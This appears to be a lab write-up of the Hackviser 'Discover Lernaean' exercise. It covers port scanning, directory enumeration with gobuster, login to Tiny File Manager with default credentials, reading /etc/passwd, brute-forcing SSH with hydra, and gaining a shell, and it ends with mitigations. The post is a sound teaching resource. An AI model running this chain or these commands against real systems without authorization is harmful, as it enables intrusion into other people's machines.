---
title: "Weak Authentication – SSH Brute Force Leading to Unauthorized Access | Discover Lernaean"
date: 2026-03-29 23:00:00 +0530
categories: [Network Security, Authentication]
tags: [weak-authentication, ssh, brute-force, hydra, directory-enumeration, file-manager-exposure, unauthorized-access, linux, hackviser]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/hydra.webp
  alt: Directory Enumeration to SSH Brute Force Attack
---

## Overview

This lab demonstrates a full attack chain starting from **directory enumeration**, leading to **admin panel access**, and ending with **SSH brute-force login**.

It highlights how multiple small misconfigurations can be chained together to gain system access.

---

## Objective

- Enumerate web directories
- Access hidden admin panels
- Extract useful information from the system
- Perform brute-force attack on SSH
- Gain access to the target machine

---

## Reconnaissance

Scan the target for open ports and services:

```bash
nmap -sV <target_ip>
```

**Output**

```
┌──(root㉿kali)-[/home/kelvin/Desktop]
└─# nmap -sV 172.20.10.43
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 08:31 -0400
Nmap scan report for 172.20.10.43 (172.20.10.43)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))

Service Info: OS: Linux
```

Open services:

- Port **22** — SSH
- Port **80** — HTTP (Apache)

---

## Directory Enumeration

Use Gobuster to find hidden directories:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/big.txt
```

**Output**

```
.htaccess            (Status: 403)
.htpasswd            (Status: 403)
filemanager          (Status: 301) [--> http://<target_ip>/filemanager/]
server-status        (Status: 403)
```

**Key Finding:** `/filemanager` directory discovered.

---

## Web Exploitation

Access the discovered directory:

```
http://<target_ip>/filemanager/
```

A login panel for **Tiny File Manager** is exposed.

### Authentication Bypass

Search for default credentials and attempt login:

```
user:12345
```

**Result**

- Successfully logged into the file manager
- Full access to server files

---

## Internal Enumeration

Navigate through system directories and inspect sensitive files.

**Path explored:**

```
/etc/passwd
```

**Discovery**

```
rock
```

A valid system user is identified.

---

## SSH Brute Force

Use Hydra to brute-force the password for user `rock`:

```bash
hydra -l rock -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
```

**Output**

```
[22][ssh] host: 172.20.10.43   login: rock   password: 7777777
```

**Credentials Found**

```
rock:7777777
```

---

## Initial Access

Login via SSH:

```bash
ssh rock@<target_ip>
```

**Result**

- Successfully logged in as user `rock`
- Gained shell access to the target machine

---

## Proof of Exploitation

- Discovered hidden directory (`/filemanager`)
- Logged in using default credentials
- Enumerated system files to find valid user
- Brute-forced SSH credentials
- Gained authenticated shell access

---

## Attack Chain Summary

1. Service enumeration (Nmap)
2. Directory brute-force (Gobuster)
3. Default credentials → File Manager access
4. User enumeration via `/etc/passwd`
5. SSH brute-force (Hydra)
6. Successful login as `rock`

---

## Impact

- Unauthorized access to admin interface
- Exposure of internal system files
- Credential discovery and brute-force success
- Remote shell access via SSH

---

## Mitigation

- Remove or secure hidden admin panels
- Change default credentials immediately
- Restrict access to sensitive directories
- Use strong passwords and enforce complexity
- Implement rate limiting / fail2ban on SSH
- Avoid exposing internal tools like file managers

---

## Real-World Insight

This lab is a perfect example of how attackers chain vulnerabilities:

- One issue alone may not be critical
- Multiple weak points together lead to full compromise

Common real-world pattern:

> Directory discovery → Admin panel → Credential leak → Brute force → Access

Always think in terms of **attack chains**, not isolated vulnerabilities.
